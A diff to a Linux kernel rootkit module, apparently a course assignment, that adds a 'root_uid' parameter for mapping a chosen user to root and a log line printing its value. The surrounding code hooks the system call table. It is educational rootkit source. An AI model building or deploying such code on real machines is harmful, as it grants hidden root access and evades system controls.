@@ -33,7 +33,7 @@ MODULE_PARM_DESC(table_addr, "Address of sys_call_table in memory");
 //******
 //TODO: NEEDED FOR PART B
 //	Accept root_uid as a kernel module parameter
-//	(see module_parm() example above)
+//	(see module_param() example above)
 //******
 /*
  * When a user with an effective UID = root_uid runs a command via execve()
@@ -41,6 +41,8 @@ MODULE_PARM_DESC(table_addr, "Address of sys_call_table in memory");
  * kernel module argument.
  */
 static int root_uid;
+module_param(root_uid, int, 0);
+MODULE_PARM_DESC(root_uid, "UID to map to root");
 
 //******
 //TODO: NEEDED FOR PART C
@@ -217,6 +219,7 @@ t_syscall_hook *new_hook(const unsigned int offset, void *newFunc)
 int init_module(void)
 {
   printk(KERN_INFO "Rootkit module initializing.\n");
+  printk(KERN_INFO "root_uid parameter has value %d.\n", root_uid);
 
   //Allocate & init a list to store our syscall_hooks
   hooks = kmalloc(sizeof(t_syscall_hook_list), GFP_KERNEL);
